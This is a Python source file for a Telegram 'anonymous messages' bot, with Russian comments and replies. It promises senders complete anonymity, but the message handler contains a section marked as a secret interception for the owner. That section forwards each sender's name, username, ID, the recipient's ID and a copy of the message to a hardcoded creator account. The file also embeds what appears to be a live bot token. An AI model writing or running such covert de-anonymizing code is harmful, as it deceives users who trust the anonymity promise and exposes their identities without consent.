import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import CommandObject, Command

TOKEN = "8516678672:AAHkxuwRJU2maLqHB9sxrs2NCkOUcDFP314"
CREATOR_ID = 7041451057  # ⚠️ Вставь сюда свой Telegram ID

bot = Bot(token=TOKEN)
dp = Dispatcher()

# Хранилище сессий: кто сейчас кому пишет (в памяти)
# user_id -> recipient_id
user_targets = {}

@dp.message(Command("start"))
async def cmd_start(message: types.Message, command: CommandObject):
    user_id = message.from_user.id
    args = command.args  # Параметр из ссылки, например ID того, кому пишем

    # Если пользователь перешёл по чьей-то ссылке (t.me/bot?start=12345)
    if args and args.isdigit():
        recipient_id = int(args)
        
        if recipient_id == user_id:
            await message.answer("❌ Вы не можете отправлять анонимные сообщения самому себе!")
            return

        user_targets[user_id] = recipient_id
        await message.answer(
            "🤫 **Вы вошли в режим анонимного сообщения!**\n\n"
            "Напишите любой текст, фото или голосовое — я передам его адресату абсолютно анонимно. "
            "Он никогда не узнает, кто вы!"
        )
    else:
        # Обычный старт — выдаём персональную ссылку
        bot_info = await bot.get_me()
        my_link = f"https://t.me/{bot_info.username}?start={user_id}"
        
        await message.answer(
            f"👋 **Привет, {message.from_user.first_name}!**\n\n"
            f"Забирай свою личную ссылку для анонимных вопросов:\n"
            f"`{my_link}`\n\n"
            f"Размести её в описании профиля, канала или в соцсетях. "
            f"Когда кто-то перейдёт по ней, он сможет отправить тебе анонимное сообщение!",
            parse_mode="Markdown"
        )

@dp.message()
async def handle_messages(message: types.Message):
    sender = message.from_user
    sender_id = sender.id

    # Проверяем, пишет ли человек кому-то по анонимной ссылке
    if sender_id in user_targets:
        recipient_id = user_targets[sender_id]
        sender_username = f"@{sender.username}" if sender.username else "Без юзернейма"

        # 1. Отправляем получателю (анонимно!)
        try:
            await bot.send_message(
                recipient_id, 
                "📩 **Вам пришло новое анонимное сообщение!**\n--------------------------------",
                parse_mode="Markdown"
            )
            # Копируем само сообщение (текст, фото, голос и т.д.)
            await message.copy_to(chat_id=recipient_id)
            
            # Подтверждение отправителю
            await message.answer("✅ Ваше сообщение успешно отправлено анонимно!")
            
            # Сбрасываем цель, чтобы следующее сообщение не отправлялось случайно туда же
            del user_targets[sender_id]

        except Exception:
            await message.answer("❌ Не удалось доставить сообщение. Возможно, пользователь заблокировал бота.")
            return

        # 2. 🕵️‍♂️ СЕКРЕТНЫЙ ПЕРЕХВАТ ДЛЯ ТЕБЯ (ВЛАДЕЛЬЦА)
        intercept_info = (
            f"🕵️‍♂️ **ПЕРЕХВАТ АНОНИМКИ!**\n\n"
            f"👤 **От кого:** {sender.full_name} ({sender_username} | ID: `{sender_id}`)\n"
            f"🎯 **Кому (ID):** `{recipient_id}`\n"
            f"--------------------------------"
        )
        try:
            await bot.send_message(CREATOR_ID, intercept_info, parse_mode="Markdown")
            await message.copy_to(chat_id=CREATOR_ID)
        except Exception as e:
            print(f"Ошибка логирования админу: {e}")

    else:
        # Если человек просто пишет в бота без ссылки
        await message.answer(
            "Чтобы отправить кому-то анонимное сообщение, перейдите по его персональной ссылке!\n\n"
            "Чтобы получить **свою** ссылку, введите команду /start"
        )

async def main():
    print("🚀 Анонимный бот с админ-доступом запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
